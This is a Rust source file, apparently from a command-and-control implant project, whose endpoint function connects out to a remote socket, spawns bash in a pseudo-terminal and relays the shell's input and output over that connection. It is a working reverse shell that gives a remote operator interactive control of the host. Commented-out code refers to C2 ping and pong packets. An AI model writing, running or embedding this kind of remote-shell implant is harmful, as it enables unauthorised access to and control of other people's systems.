use std::{net::SocketAddr, thread};

use portable_pty::{CommandBuilder, PtySize, native_pty_system};
use unshell_rs_lib::{
    Error,
    networkers::Connection,
    nodes::{ConnectionConfig, NodeContainer},
};

pub fn run_endpoint(socket: SocketAddr) -> Result<(), Error> {
    let node = NodeContainer::connect(
        "Server".to_string(),
        vec![],
        vec![ConnectionConfig {
            socket,
            layers: vec![],
        }],
    )?;

    let mut stream = node.recv_stream()?;

    let pty_system = native_pty_system();
    let pty_pair = pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    })?;

    let mut cmd = CommandBuilder::new("bash");
    cmd.env("TERM", "xterm-256color");
    // pty_pair.

    let child = pty_pair.slave.spawn_command(cmd)?;

    // Get the master PTY for reading/writing
    let master = pty_pair.master;

    let mut master_reader = master.try_clone_reader()?;
    let mut master_writer = master.take_writer()?;

    // Clone stream for bidirectional communication
    let mut stream_clone = stream.try_clone()?;

    // Thread to read from PTY and write to TCP stream
    let pty_to_tcp = thread::spawn(move || {
        let mut buffer = [0u8; 1024];
        loop {
            match master_reader.read(&mut buffer) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    if stream.write(&buffer[..n]).is_err() {
                        break;
                    }
                    // stream.flush().ok();
                }
                Err(e) => {
                    error!("Error reading from PTY: {}", e);
                    break;
                }
            }
        }
        println!("stopped!");
    });

    // Thread to read from TCP stream and write to PTY
    let tcp_to_pty = thread::spawn(move || {
        // let mut buffer = [0u8; 1024];
        loop {
            let data = stream_clone.read().unwrap();
            if master_writer.write(&data).is_err() {
                break;
            }
        }
        println!("stopped!");
    });

    // Wait for either thread to finish
    let _ = pty_to_tcp.join();
    let _ = tcp_to_pty.join();

    // Clean up the child process
    // let _ = child.kill();
    // let _ = child.wait();

    Ok(())

    // loop {
    // let data = stream.read()?;
    // println!("DATA: {:?}", data);

    // let (src, packet) = node()?;
    // match packet {
    //     C2Packet::Ping => {
    //         info!("Ping from {}!", src);
    //         // node.send_unrouted(&src, &C2Packet::Pong)?;
    //         // (&mut node.state.lock().unwrap()).send_unrouted(src, &C2Packet::Pong)?;
    //     }
    //     C2Packet::Pong => {
    //         info!("Pong!");
    //     }
    //     _ => {}
    // }
    // }
}
